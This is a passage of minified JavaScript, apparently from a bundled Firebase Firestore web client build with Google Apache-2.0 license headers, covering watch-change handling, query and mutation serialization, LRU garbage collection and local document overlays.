 */class rg{constructor(e,t,r,i,s){this.snapshotVersion=e,this.targetChanges=t,this.targetMismatches=r,this.documentUpdates=i,this.resolvedLimboDocuments=s}static createSynthesizedRemoteEventForCurrentChange(e,t,r){const i=new Map;return i.set(e,Sh.createSynthesizedTargetChangeForCurrentChange(e,t,r)),new rg(De.min(),i,new Qt($e),ws(),Ye())}}class Sh{constructor(e,t,r,i,s){this.resumeToken=e,this.current=t,this.addedDocuments=r,this.modifiedDocuments=i,this.removedDocuments=s}static createSynthesizedTargetChangeForCurrentChange(e,t,r){return new Sh(r,t,Ye(),Ye(),Ye())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Kf{constructor(e,t,r,i){this.me=e,this.removedTargetIds=t,this.key=r,this.fe=i}}class Wk{constructor(e,t){this.targetId=e,this.ge=t}}class $k{constructor(e,t,r=Fn.EMPTY_BYTE_STRING,i=null){this.state=e,this.targetIds=t,this.resumeToken=r,this.cause=i}}class sS{constructor(){this.pe=0,this.ye=oS(),this.we=Fn.EMPTY_BYTE_STRING,this.Se=!1,this.be=!0}get current(){return this.Se}get resumeToken(){return this.we}get De(){return this.pe!==0}get ve(){return this.be}Ce(e){e.approximateByteSize()>0&&(this.be=!0,this.we=e)}Fe(){let e=Ye(),t=Ye(),r=Ye();return this.ye.forEach((i,s)=>{switch(s){case 0:e=e.add(i);break;case 2:t=t.add(i);break;case 1:r=r.add(i);break;default:Ne()}}),new Sh(this.we,this.Se,e,t,r)}Me(){this.be=!1,this.ye=oS()}xe(e,t){this.be=!0,this.ye=this.ye.insert(e,t)}Oe(e){this.be=!0,this.ye=this.ye.remove(e)}Ne(){this.pe+=1}Be(){this.pe-=1,st(this.pe>=0)}Le(){this.be=!0,this.Se=!0}}class SF{constructor(e){this.ke=e,this.qe=new Map,this.Qe=ws(),this.$e=wf(),this.Ue=wf(),this.Ke=new Qt($e)}We(e){for(const t of e.me)e.fe&&e.fe.isFoundDocument()?this.Ge(t,e.fe):this.ze(t,e.key,e.fe);for(const t of e.removedTargetIds)this.ze(t,e.key,e.fe)}je(e){this.forEachTarget(e,t=>{const r=this.He(t);switch(e.state){case 0:this.Je(t)&&r.Ce(e.resumeToken);break;case 1:r.Be(),r.De||r.Me(),r.Ce(e.resumeToken);break;case 2:r.Be(),r.De||this.removeTarget(t);break;case 3:this.Je(t)&&(r.Le(),r.Ce(e.resumeToken));break;case 4:this.Je(t)&&(this.Ye(t),r.Ce(e.resumeToken));break;default:Ne()}})}forEachTarget(e,t){e.targetIds.length>0?e.targetIds.forEach(t):this.qe.forEach((r,i)=>{this.Je(i)&&t(i)})}Ze(e){const t=e.targetId,r=e.ge.count,i=this.Xe(t);if(i){const s=i.target;if(ky(s))if(r===0){const o=new Te(s.path);this.ze(t,o,er.newNoDocument(o,De.min()))}else st(r===1);else{const o=this.et(t);if(o!==r){const a=this.tt(e),l=a?this.nt(a,e,o):1;if(l!==0){this.Ye(t);const u=l===2?"TargetPurposeExistenceFilterMismatchBloom":"TargetPurposeExistenceFilterMismatch";this.Ke=this.Ke.insert(t,u)}}}}}tt(e){const t=e.ge.unchangedNames;if(!t||!t.bits)return null;const{bits:{bitmap:r="",padding:i=0},hashCount:s=0}=t;let o,a;try{o=yo(r).toUint8Array()}catch(l){if(l instanceof dk)return Kl("Decoding the base64 bloom filter in existence filter failed ("+l.message+"); ignoring the bloom filter and falling back to full re-query."),null;throw l}try{a=new Wv(o,i,s)}catch(l){return Kl(l instanceof Xc?"BloomFilter error: ":"Applying bloom filter failed: ",l),null}return a.Ee===0?null:a}nt(e,t,r){return t.ge.count===r-this.st(e,t.targetId)?0:2}st(e,t){const r=this.ke.getRemoteKeysForTarget(t);let i=0;return r.forEach(s=>{const o=this.ke.it(),a=`projects/${o.projectId}/databases/${o.database}/documents/${s.path.canonicalString()}`;e.mightContain(a)||(this.ze(t,s,null),i++)}),i}ot(e){const t=new Map;this.qe.forEach((s,o)=>{const a=this.Xe(o);if(a){if(s.current&&ky(a.target)){const l=new Te(a.target.path);this._t(l).has(o)||this.ut(o,l)||this.ze(o,l,er.newNoDocument(l,e))}s.ve&&(t.set(o,s.Fe()),s.Me())}});let r=Ye();this.Ue.forEach((s,o)=>{let a=!0;o.forEachWhile(l=>{const u=this.Xe(l);return!u||u.purpose==="TargetPurposeLimboResolution"||(a=!1,!1)}),a&&(r=r.add(s))}),this.Qe.forEach((s,o)=>o.setReadTime(e));const i=new rg(e,t,this.Ke,this.Qe,r);return this.Qe=ws(),this.$e=wf(),this.Ue=wf(),this.Ke=new Qt($e),i}Ge(e,t){if(!this.Je(e))return;const r=this.ut(e,t.key)?2:0;this.He(e).xe(t.key,r),this.Qe=this.Qe.insert(t.key,t),this.$e=this.$e.insert(t.key,this._t(t.key).add(e)),this.Ue=this.Ue.insert(t.key,this.ct(t.key).add(e))}ze(e,t,r){if(!this.Je(e))return;const i=this.He(e);this.ut(e,t)?i.xe(t,1):i.Oe(t),this.Ue=this.Ue.insert(t,this.ct(t).delete(e)),this.Ue=this.Ue.insert(t,this.ct(t).add(e)),r&&(this.Qe=this.Qe.insert(t,r))}removeTarget(e){this.qe.delete(e)}et(e){const t=this.He(e).Fe();return this.ke.getRemoteKeysForTarget(e).size+t.addedDocuments.size-t.removedDocuments.size}Ne(e){this.He(e).Ne()}He(e){let t=this.qe.get(e);return t||(t=new sS,this.qe.set(e,t)),t}ct(e){let t=this.Ue.get(e);return t||(t=new wn($e),this.Ue=this.Ue.insert(e,t)),t}_t(e){let t=this.$e.get(e);return t||(t=new wn($e),this.$e=this.$e.insert(e,t)),t}Je(e){const t=this.Xe(e)!==null;return t||me("WatchChangeAggregator","Detected inactive target",e),t}Xe(e){const t=this.qe.get(e);return t&&t.De?null:this.ke.lt(e)}Ye(e){this.qe.set(e,new sS),this.ke.getRemoteKeysForTarget(e).forEach(t=>{this.ze(e,t,null)})}ut(e,t){return this.ke.getRemoteKeysForTarget(e).has(t)}}function wf(){return new Qt(Te.comparator)}function oS(){return new Qt(Te.comparator)}const TF=(()=>({asc:"ASCENDING",desc:"DESCENDING"}))(),AF=(()=>({"<":"LESS_THAN","<=":"LESS_THAN_OR_EQUAL",">":"GREATER_THAN",">=":"GREATER_THAN_OR_EQUAL","==":"EQUAL","!=":"NOT_EQUAL","array-contains":"ARRAY_CONTAINS",in:"IN","not-in":"NOT_IN","array-contains-any":"ARRAY_CONTAINS_ANY"}))(),bF=(()=>({and:"AND",or:"OR"}))();class xF{constructor(e,t){this.databaseId=e,this.useProto3Json=t}}function My(n,e){return n.useProto3Json||Zp(e)?e:{value:e}}function Yd(n,e){return n.useProto3Json?`${new Date(1e3*e.seconds).toISOString().replace(/\.\d*/,"").replace("Z","")}.${("000000000"+e.nanoseconds).slice(-9)}Z`:{seconds:""+e.seconds,nanos:e.nanoseconds}}function Hk(n,e){return n.useProto3Json?e.toBase64():e.toUint8Array()}function kF(n,e){return Yd(n,e.toTimestamp())}function Mi(n){return st(!!n),De.fromTimestamp(function(t){const r=mo(t);return new yn(r.seconds,r.nanos)}(n))}function $v(n,e){return Ny(n,e).canonicalString()}function Ny(n,e){const t=function(i){return new Mt(["projects",i.projectId,"databases",i.database])}(n).child("documents");return e===void 0?t:t.child(e)}function qk(n){const e=Mt.fromString(n);return st(Zk(e)),e}function Py(n,e){return $v(n.databaseId,e.path)}function Dm(n,e){const t=qk(e);if(t.get(1)!==n.databaseId.projectId)throw new we(ie.INVALID_ARGUMENT,"Tried to deserialize key from different project: "+t.get(1)+" vs "+n.databaseId.projectId);if(t.get(3)!==n.databaseId.database)throw new we(ie.INVALID_ARGUMENT,"Tried to deserialize key from different database: "+t.get(3)+" vs "+n.databaseId.database);return new Te(Gk(t))}function Kk(n,e){return $v(n.databaseId,e)}function CF(n){const e=qk(n);return e.length===4?Mt.emptyPath():Gk(e)}function Ly(n){return new Mt(["projects",n.databaseId.projectId,"databases",n.databaseId.database]).canonicalString()}function Gk(n){return st(n.length>4&&n.get(4)==="documents"),n.popFirst(5)}function aS(n,e,t){return{name:Py(n,e),fields:t.value.mapValue.fields}}function RF(n,e){let t;if("targetChange"in e){e.targetChange;const r=function(u){return u==="NO_CHANGE"?0:u==="ADD"?1:u==="REMOVE"?2:u==="CURRENT"?3:u==="RESET"?4:Ne()}(e.targetChange.targetChangeType||"NO_CHANGE"),i=e.targetChange.targetIds||[],s=function(u,h){return u.useProto3Json?(st(h===void 0||typeof h=="string"),Fn.fromBase64String(h||"")):(st(h===void 0||h instanceof ve.Buffer||h instanceof Uint8Array),Fn.fromUint8Array(h||new Uint8Array))}(n,e.targetChange.resumeToken),o=e.targetChange.cause,a=o&&function(u){const h=u.code===void 0?ie.UNKNOWN:zk(u.code);return new we(h,u.message||"")}(o);t=new $k(r,i,s,a||null)}else if("documentChange"in e){e.documentChange;const r=e.documentChange;r.document,r.document.name,r.document.updateTime;const i=Dm(n,r.document.name),s=Mi(r.document.updateTime),o=r.document.createTime?Mi(r.document.createTime):De.min(),a=new yr({mapValue:{fields:r.document.fields}}),l=er.newFoundDocument(i,s,o,a),u=r.targetIds||[],h=r.removedTargetIds||[];t=new Kf(u,h,l.key,l)}else if("documentDelete"in e){e.documentDelete;const r=e.documentDelete;r.document;const i=Dm(n,r.document),s=r.readTime?Mi(r.readTime):De.min(),o=er.newNoDocument(i,s),a=r.removedTargetIds||[];t=new Kf([],a,o.key,o)}else if("documentRemove"in e){e.documentRemove;const r=e.documentRemove;r.document;const i=Dm(n,r.document),s=r.removedTargetIds||[];t=new Kf([],s,i,null)}else{if(!("filter"in e))return Ne();{e.filter;const r=e.filter;r.targetId;const{count:i=0,unchangedNames:s}=r,o=new _F(i,s),a=r.targetId;t=new Wk(a,o)}}return t}function MF(n,e){let t;if(e instanceof Ih)t={update:aS(n,e.key,e.value)};else if(e instanceof Fk)t={delete:Py(n,e.key)};else if(e instanceof ko)t={update:aS(n,e.key,e.data),updateMask:VF(e.fieldMask)};else{if(!(e instanceof yF))return Ne();t={verify:Py(n,e.key)}}return e.fieldTransforms.length>0&&(t.updateTransforms=e.fieldTransforms.map(r=>function(s,o){const a=o.transform;if(a instanceof Gd)return{fieldPath:o.field.canonicalString(),setToServerValue:"REQUEST_TIME"};if(a instanceof eh)return{fieldPath:o.field.canonicalString(),appendMissingElements:{values:a.elements}};if(a instanceof th)return{fieldPath:o.field.canonicalString(),removeAllFromArray:{values:a.elements}};if(a instanceof Qd)return{fieldPath:o.field.canonicalString(),increment:a.Ie};throw Ne()}(0,r))),e.precondition.isNone||(t.currentDocument=function(i,s){return s.updateTime!==void 0?{updateTime:kF(i,s.updateTime)}:s.exists!==void 0?{exists:s.exists}:Ne()}(n,e.precondition)),t}function NF(n,e){return n&&n.length>0?(st(e!==void 0),n.map(t=>function(i,s){let o=i.updateTime?Mi(i.updateTime):Mi(s);return o.isEqual(De.min())&&(o=Mi(s)),new pF(o,i.transformResults||[])}(t,e))):[]}function PF(n,e){return{documents:[Kk(n,e.path)]}}function LF(n,e){const t={structuredQuery:{}},r=e.path;let i;e.collectionGroup!==null?(i=r,t.structuredQuery.from=[{collectionId:e.collectionGroup,allDescendants:!0}]):(i=r.popLast(),t.structuredQuery.from=[{collectionId:r.lastSegment()}]),t.parent=Kk(n,i);const s=function(u){if(u.length!==0)return Yk(yi.create(u,"and"))}(e.filters);s&&(t.structuredQuery.where=s);const o=function(u){if(u.length!==0)return u.map(h=>function(p){return{field:Qa(p.field),direction:BF(p.dir)}}(h))}(e.orderBy);o&&(t.structuredQuery.orderBy=o);const a=My(n,e.limit);return a!==null&&(t.structuredQuery.limit=a),e.startAt&&(t.structuredQuery.startAt=function(u){return{before:u.inclusive,values:u.position}}(e.startAt)),e.endAt&&(t.structuredQuery.endAt=function(u){return{before:!u.inclusive,values:u.position}}(e.endAt)),{ht:t,parent:i}}function DF(n){let e=CF(n.parent);const t=n.structuredQuery,r=t.from?t.from.length:0;let i=null;if(r>0){st(r===1);const h=t.from[0];h.allDescendants?i=h.collectionId:e=e.child(h.collectionId)}let s=[];t.where&&(s=function(f){const p=Qk(f);return p instanceof yi&&Tk(p)?p.getFilters():[p]}(t.where));let o=[];t.orderBy&&(o=function(f){return f.map(p=>function(x){return new Kd(Ya(x.field),function(I){switch(I){case"ASCENDING":return"asc";case"DESCENDING":return"desc";default:return}}(x.direction))}(p))}(t.orderBy));let a=null;t.limit&&(a=function(f){let p;return p=typeof f=="object"?f.value:f,Zp(p)?null:p}(t.limit));let l=null;t.startAt&&(l=function(f){const p=!!f.before,w=f.values||[];return new qd(w,p)}(t.startAt));let u=null;return t.endAt&&(u=function(f){const p=!f.before,w=f.values||[];return new qd(w,p)}(t.endAt)),tF(e,i,o,s,a,"F",l,u)}function OF(n,e){const t=function(i){switch(i){case"TargetPurposeListen":return null;case"TargetPurposeExistenceFilterMismatch":return"existence-filter-mismatch";case"TargetPurposeExistenceFilterMismatchBloom":return"existence-filter-mismatch-bloom";case"TargetPurposeLimboResolution":return"limbo-document";default:return Ne()}}(e.purpose);return t==null?null:{"goog-listen-tags":t}}function Qk(n){return n.unaryFilter!==void 0?function(t){switch(t.unaryFilter.op){case"IS_NAN":const r=Ya(t.unaryFilter.field);return dn.create(r,"==",{doubleValue:NaN});case"IS_NULL":const i=Ya(t.unaryFilter.field);return dn.create(i,"==",{nullValue:"NULL_VALUE"});case"IS_NOT_NAN":const s=Ya(t.unaryFilter.field);return dn.create(s,"!=",{doubleValue:NaN});case"IS_NOT_NULL":const o=Ya(t.unaryFilter.field);return dn.create(o,"!=",{nullValue:"NULL_VALUE"});default:return Ne()}}(n):n.fieldFilter!==void 0?function(t){return dn.create(Ya(t.fieldFilter.field),function(i){switch(i){case"EQUAL":return"==";case"NOT_EQUAL":return"!=";case"GREATER_THAN":return">";case"GREATER_THAN_OR_EQUAL":return">=";case"LESS_THAN":return"<";case"LESS_THAN_OR_EQUAL":return"<=";case"ARRAY_CONTAINS":return"array-contains";case"IN":return"in";case"NOT_IN":return"not-in";case"ARRAY_CONTAINS_ANY":return"array-contains-any";default:return Ne()}}(t.fieldFilter.op),t.fieldFilter.value)}(n):n.compositeFilter!==void 0?function(t){return yi.create(t.compositeFilter.filters.map(r=>Qk(r)),function(i){switch(i){case"AND":return"and";case"OR":return"or";default:return Ne()}}(t.compositeFilter.op))}(n):Ne()}function BF(n){return TF[n]}function UF(n){return AF[n]}function jF(n){return bF[n]}function Qa(n){return{fieldPath:n.canonicalString()}}function Ya(n){return Un.fromServerFormat(n.fieldPath)}function Yk(n){return n instanceof dn?function(t){if(t.op==="=="){if(GI(t.value))return{unaryFilter:{field:Qa(t.field),op:"IS_NAN"}};if(KI(t.value))return{unaryFilter:{field:Qa(t.field),op:"IS_NULL"}}}else if(t.op==="!="){if(GI(t.value))return{unaryFilter:{field:Qa(t.field),op:"IS_NOT_NAN"}};if(KI(t.value))return{unaryFilter:{field:Qa(t.field),op:"IS_NOT_NULL"}}}return{fieldFilter:{field:Qa(t.field),op:UF(t.op),value:t.value}}}(n):n instanceof yi?function(t){const r=t.getFilters().map(i=>Yk(i));return r.length===1?r[0]:{compositeFilter:{op:jF(t.op),filters:r}}}(n):Ne()}function VF(n){const e=[];return n.fields.forEach(t=>e.push(t.canonicalString())),{fieldPaths:e}}function Zk(n){return n.length>=4&&n.get(0)==="projects"&&n.get(2)==="databases"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Gs{constructor(e,t,r,i,s=De.min(),o=De.min(),a=Fn.EMPTY_BYTE_STRING,l=null){this.target=e,this.targetId=t,this.purpose=r,this.sequenceNumber=i,this.snapshotVersion=s,this.lastLimboFreeSnapshotVersion=o,this.resumeToken=a,this.expectedCount=l}withSequenceNumber(e){return new Gs(this.target,this.targetId,this.purpose,e,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,this.expectedCount)}withResumeToken(e,t){return new Gs(this.target,this.targetId,this.purpose,this.sequenceNumber,t,this.lastLimboFreeSnapshotVersion,e,null)}withExpectedCount(e){return new Gs(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,e)}withLastLimboFreeSnapshotVersion(e){return new Gs(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,e,this.resumeToken,this.expectedCount)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class FF{constructor(e){this.Tt=e}}function zF(n){const e=DF({parent:n.parent,structuredQuery:n.structuredQuery});return n.limitType==="LAST"?Ry(e,e.limit,"L"):e}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class WF{constructor(){this.Tn=new $F}addToCollectionParentIndex(e,t){return this.Tn.add(t),re.resolve()}getCollectionParents(e,t){return re.resolve(this.Tn.getEntries(t))}addFieldIndex(e,t){return re.resolve()}deleteFieldIndex(e,t){return re.resolve()}deleteAllFieldIndexes(e){return re.resolve()}createTargetIndexes(e,t){return re.resolve()}getDocumentsMatchingTarget(e,t){return re.resolve(null)}getIndexType(e,t){return re.resolve(0)}getFieldIndexes(e,t){return re.resolve([])}getNextCollectionGroupToUpdate(e){return re.resolve(null)}getMinOffset(e,t){return re.resolve(go.min())}getMinOffsetFromCollectionGroup(e,t){return re.resolve(go.min())}updateCollectionGroup(e,t,r){return re.resolve()}updateIndexEntries(e,t){return re.resolve()}}class $F{constructor(){this.index={}}add(e){const t=e.lastSegment(),r=e.popLast(),i=this.index[t]||new wn(Mt.comparator),s=!i.has(r);return this.index[t]=i.add(r),s}has(e){const t=e.lastSegment(),r=e.popLast(),i=this.index[t];return i&&i.has(r)}getEntries(e){return(this.index[e]||new wn(Mt.comparator)).toArray()}}/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const lS={didRun:!1,sequenceNumbersCollected:0,targetsRemoved:0,documentsRemoved:0},Jk=41943040;class dr{static withCacheSize(e){return new dr(e,dr.DEFAULT_COLLECTION_PERCENTILE,dr.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT)}constructor(e,t,r){this.cacheSizeCollectionThreshold=e,this.percentileToCollect=t,this.maximumSequenceNumbersToCollect=r}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */dr.DEFAULT_COLLECTION_PERCENTILE=10,dr.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT=1e3,dr.DEFAULT=new dr(Jk,dr.DEFAULT_COLLECTION_PERCENTILE,dr.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT),dr.DISABLED=new dr(-1,0,0);/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Zl{constructor(e){this.$n=e}next(){return this.$n+=2,this.$n}static Un(){return new Zl(0)}static Kn(){return new Zl(-1)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const cS="LruGarbageCollector",HF=1048576;function uS([n,e],[t,r]){const i=$e(n,t);return i===0?$e(e,r):i}class qF{constructor(e){this.Hn=e,this.buffer=new wn(uS),this.Jn=0}Yn(){return++this.Jn}Zn(e){const t=[e,this.Yn()];if(this.buffer.size<this.Hn)this.buffer=this.buffer.add(t);else{const r=this.buffer.last();uS(t,r)<0&&(this.buffer=this.buffer.delete(r).add(t))}}get maxValue(){return this.buffer.last()[0]}}class KF{constructor(e,t,r){this.garbageCollector=e,this.asyncQueue=t,this.localStore=r,this.Xn=null}start(){this.garbageCollector.params.cacheSizeCollectionThreshold!==-1&&this.er(6e4)}stop(){this.Xn&&(this.Xn.cancel(),this.Xn=null)}get started(){return this.Xn!==null}er(e){me(cS,`Garbage collection scheduled in ${e}ms`),this.Xn=this.asyncQueue.enqueueAfterDelay("lru_garbage_collection",e,async()=>{this.Xn=null;try{await this.localStore.collectGarbage(this.garbageCollector)}catch(t){gc(t)?me(cS,"Ignoring IndexedDB error during garbage collection: ",t):await pc(t)}await this.er(3e5)})}}class GF{constructor(e,t){this.tr=e,this.params=t}calculateTargetCount(e,t){return this.tr.nr(e).next(r=>Math.floor(t/100*r))}nthSequenceNumber(e,t){if(t===0)return re.resolve(Yp.ae);const r=new qF(t);return this.tr.forEachTarget(e,i=>r.Zn(i.sequenceNumber)).next(()=>this.tr.rr(e,i=>r.Zn(i))).next(()=>r.maxValue)}removeTargets(e,t,r){return this.tr.removeTargets(e,t,r)}removeOrphanedDocuments(e,t){return this.tr.removeOrphanedDocuments(e,t)}collect(e,t){return this.params.cacheSizeCollectionThreshold===-1?(me("LruGarbageCollector","Garbage collection skipped; disabled"),re.resolve(lS)):this.getCacheSize(e).next(r=>r<this.params.cacheSizeCollectionThreshold?(me("LruGarbageCollector",`Garbage collection skipped; Cache size ${r} is lower than threshold ${this.params.cacheSizeCollectionThreshold}`),lS):this.ir(e,t))}getCacheSize(e){return this.tr.getCacheSize(e)}ir(e,t){let r,i,s,o,a,l,u;const h=Date.now();return this.calculateTargetCount(e,this.params.percentileToCollect).next(f=>(f>this.params.maximumSequenceNumbersToCollect?(me("LruGarbageCollector",`Capping sequence numbers to collect down to the maximum of ${this.params.maximumSequenceNumbersToCollect} from ${f}`),i=this.params.maximumSequenceNumbersToCollect):i=f,o=Date.now(),this.nthSequenceNumber(e,i))).next(f=>(r=f,a=Date.now(),this.removeTargets(e,r,t))).next(f=>(s=f,l=Date.now(),this.removeOrphanedDocuments(e,r))).next(f=>(u=Date.now(),Ka()<=Qe.DEBUG&&me("LruGarbageCollector",`LRU Garbage Collection
	Counted targets in ${o-h}ms
	Determined least recently used ${i} in `+(a-o)+`ms
	Removed ${s} targets in `+(l-a)+`ms
	Removed ${f} documents in `+(u-l)+`ms
Total Duration: ${u-h}ms`),re.resolve({didRun:!0,sequenceNumbersCollected:i,targetsRemoved:s,documentsRemoved:f})))}}function QF(n,e){return new GF(n,e)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class YF{constructor(){this.changes=new xa(e=>e.toString(),(e,t)=>e.isEqual(t)),this.changesApplied=!1}addEntry(e){this.assertNotApplied(),this.changes.set(e.key,e)}removeEntry(e,t){this.assertNotApplied(),this.changes.set(e,er.newInvalidDocument(e).setReadTime(t))}getEntry(e,t){this.assertNotApplied();const r=this.changes.get(t);return r!==void 0?re.resolve(r):this.getFromCache(e,t)}getEntries(e,t){return this.getAllFromCache(e,t)}apply(e){return this.assertNotApplied(),this.changesApplied=!0,this.applyChanges(e)}assertNotApplied(){}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *//**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ZF{constructor(e,t){this.overlayedDocument=e,this.mutatedFields=t}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class JF{constructor(e,t,r,i){this.remoteDocumentCache=e,this.mutationQueue=t,this.documentOverlayCache=r,this.indexManager=i}getDocument(e,t){let r=null;return this.documentOverlayCache.getOverlay(e,t).next(i=>(r=i,this.remoteDocumentCache.getEntry(e,t))).next(i=>(r!==null&&wu(r.mutation,i,Rr.empty(),yn.now()),i))}getDocuments(e,t){return this.remoteDocumentCache.getEntries(e,t).next(r=>this.getLocalViewOfDocuments(e,r,Ye()).next(()=>r))}getLocalViewOfDocuments(e,t,r=Ye()){const i=Xo();return this.populateOverlays(e,i,t).next(()=>this.computeViews(e,t,i,r).next(s=>{let o=Jc();return s.forEach((a,l)=>{o=o.insert(a,l.overlayedDocument)}),o}))}getOverlayedDocuments(e,t){const r=Xo();return this.populateOverlays(e,r,t).next(()=>this.computeViews(e,t,r,Ye()))}populateOverlays(e,t,r){const i=[];return r.forEach(s=>{t.has(s)||i.push(s)}),this.documentOverlayCache.getOverlays(e,i).next(s=>{s.forEach((o,a)=>{t.set(o,a)})})}computeViews(e,t,r,i){let s=ws();const o=yu(),a=function(){return yu()}();return t.forEach((l,u)=>{const h=r.get(u.key);i.has(u.key)&&(h===void 0||h.mutation instanceof ko)?s=s.insert(u.key,u):h!==void 0?(o.set(u.key,h.mutation.getFieldMask()),wu(h.mutation,u,h.mutation.getFieldMask(),yn.now())):o.set(u.key,Rr.empty())}),this.recalculateAndSaveOverlays(e,s).next(l=>(l.forEach((u,h)=>o.set(u,h)),t.forEach((u,h)=>{var f;return a.set(u,new ZF(h,(f=o.get(u))!==null&&f!==void 0?f:null))}),a))}recalculateAndSaveOverlays(e,t){const r=yu();let i=new Qt((o,a)=>o-a),s=Ye();return this.mutationQueue.getAllMutationBatchesAffectingDocumentKeys(e,t).next(o=>{for(const a of o)a.keys().forEach(l=>{const u=t.get(l);if(u===null)return;let h=r.get(l)||Rr.empty();h=a.applyToLocalView(u,h),r.set(l,h);const f=(i.get(a.batchId)||Ye()).add(l);i=i.insert(a.batchId,f)})}).next(()=>{const o=[],a=i.getReverseIterator();for(;a.hasNext();){const l=a.getNext(),u=l.key,h=l.value,f=Pk();h.forEach(p=>{if(!s.has(p)){const 